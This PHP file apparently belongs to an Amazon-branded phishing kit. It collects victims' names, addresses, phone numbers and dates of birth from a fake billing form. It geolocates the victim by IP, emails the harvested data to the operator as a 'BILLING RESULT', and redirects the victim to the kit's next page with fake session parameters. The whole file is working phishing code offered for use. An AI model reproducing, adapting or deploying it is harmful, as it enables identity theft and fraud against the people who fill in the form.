<?php 
##############################################################################################################################################################
		session_start();
		include('../bots.php');
		include('../config.php');
##############################################################################################################################################################
        $IP = $_SERVER['REMOTE_ADDR'];
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
##############################################################################################################################################################
		$FULLNAME = $_POST['full_name'];
		$ADDRESS1 = $_POST['add_1'];
		$ADDRESS2 = $_POST['add_2'];
		$CITY = $_POST['city'];
		$STATE = $_POST['state'];
		$ZIP = $_POST['ZIP'];
		$PHONE = $_POST['phone'];
		$DOB = $_POST['DOB'];
##############################################################################################################################################################
		$MESSAGE="<div style='font-size:13px;font-family:monospace'>";
		$MESSAGE.="<b>DEAR, <font color='#cc1414'>".$PRONAME."</font> THIS IS YOUR BILLING RESULT ENJOY !</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[FULLNAME]</font></b>        :<b>".$FULLNAME."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[ADDRESS I]</font></b>       :<b>".$ADDRESS1."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[ADDRESS II]</font></b>      :<b>".$ADDRESS2."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[CITY]</font></b>            :<b>".$CITY."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[STATE]</font></b>           :<b>".$STATE."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[COUNTRY]</font></b>         :<b>".$COUNTRYCODE."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[ZIP]</font></b>             :<b>".$ZIP."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[DOB]</font></b>             :<b>".$DOB." - MM/DD/YYYY </b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[PHONE]</font></b>           :<b>".$PHONE."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[IP]</font></b>              :<a href='http://ip-api.com/$IP' target='_blank'>$IP (Click for more information)</a><br>";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[COUNTRY]</font></b>         : <b>".$COUNTRYNAME." - ".$COUNTRYCODE." </b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[BROWSER & OS]</font></b>    : <b>".$device_details."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[TIME]</font></b>            : <b>".date('l jS \of F Y h:i:s A')."</b> <br></div>\n";
		$MESSAGE = wordwrap($MESSAGE,70);
##############################################################################################################################################################
		$SUBJECT = "(AMAZON)(BILLING)($IP)($COUNTRYNAME)";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: Mr. Clean ☑ <BILL_$IP>\n";
		mail($TO,$SUBJECT,$MESSAGE,$HEADER);
		$CODED  ="lastmono.php?cmd=_update_information&account_wall=".md5(microtime())."&lim_session=".sha1(microtime());
        header("Location: $CODED");
##############################################################################################################################################################
?>